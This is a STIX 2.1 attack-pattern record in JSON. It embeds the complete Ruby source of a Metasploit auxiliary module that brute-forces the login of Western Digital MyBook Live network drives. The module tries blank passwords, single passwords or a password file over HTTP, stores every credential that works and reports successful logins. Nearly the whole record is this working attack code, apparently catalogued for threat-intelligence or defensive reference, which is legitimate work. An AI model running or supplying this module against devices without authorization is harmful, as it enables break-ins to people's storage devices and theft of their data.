{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--100cb774-5be9-474b-b02b-541dc0ef62a8",
    "created": "2024-08-14T16:28:54.743341Z",
    "modified": "2024-08-14T16:28:54.743345Z",
    "name": "Western Digital MyBook Live Login Utility",
    "description": "This module simply attempts to login to a Western Digital MyBook Live instance using a specific user/pass.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/mybook_live_login.rb",
            "external_id": "mybook_live_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/mybook_live'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n    super(\n      'Name'           => 'Western Digital MyBook Live Login Utility',\n      'Description'    => 'This module simply attempts to login to a Western Digital MyBook Live instance using a specific user/pass.',\n      'Author'         => [ 'Nicholas Starke <starke.nicholas[at]gmail.com>' ],\n      'License'        => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n\n    register_autofilter_ports([ 80 ])\n\n    # username is hardcoded into application\n    deregister_options(\n      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',\n      'USERNAME', 'USER_FILE', 'USER_AS_PASS', 'PASSWORD_SPRAY')\n  end\n\n  def setup\n    super\n    # They must select at least blank passwords, provide a pass file or a password\n    one_required = %w(BLANK_PASSWORDS PASS_FILE PASSWORD)\n    unless one_required.any? { |o| datastore.has_key?(o) && datastore[o] }\n      fail_with(Failure::BadConfig, \"Invalid options: One of #{one_required.join(', ')} must be set\")\n    end\n    if !datastore['PASS_FILE']\n      if !datastore['BLANK_PASSWORDS'] && datastore['PASSWORD'].blank?\n        fail_with(Failure::BadConfig, \"PASSWORD or PASS_FILE must be set to a non-empty string if not BLANK_PASSWORDS\")\n      end\n    end\n  end\n\n  def run_host(ip)\n    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(\n      blank_passwords: datastore['BLANK_PASSWORDS'],\n      pass_file: datastore['PASS_FILE'],\n      password: datastore['PASSWORD']\n    )\n    cred_collection = prepend_db_passwords(cred_collection)\n\n    scanner = Metasploit::Framework::LoginScanner::MyBookLive.new(\n      configure_http_login_scanner(\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 10,\n        http_username: datastore['HttpUsername'],\n        http_password: datastore['HttpPassword']\n      )\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: fullname,\n        workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})\"\n      end\n    end\n  end\nend\n"
}